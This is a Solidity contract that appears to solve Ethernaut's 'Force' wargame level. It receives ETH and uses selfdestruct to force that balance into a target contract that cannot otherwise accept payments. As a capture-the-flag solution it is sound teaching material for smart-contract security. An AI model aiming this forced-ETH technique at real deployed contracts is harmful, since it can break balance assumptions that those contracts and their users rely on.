// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Ethernaut 07 - Force Solver
/// @notice Accepts ETH and transfers its balance to a target through selfdestruct.
contract ForceSolver {
    /// @notice Forces this contract's full ETH balance into the target.
    /// @dev After Cancun, selfdestruct generally retains code and storage but still transfers ETH.
    /// @param target Address that receives the solver's balance.
    function solve(address payable target) external {
        selfdestruct(target);
    }

    /// @notice Allows the solver to receive the ETH that will be forced into the target.
    receive() external payable {}
}
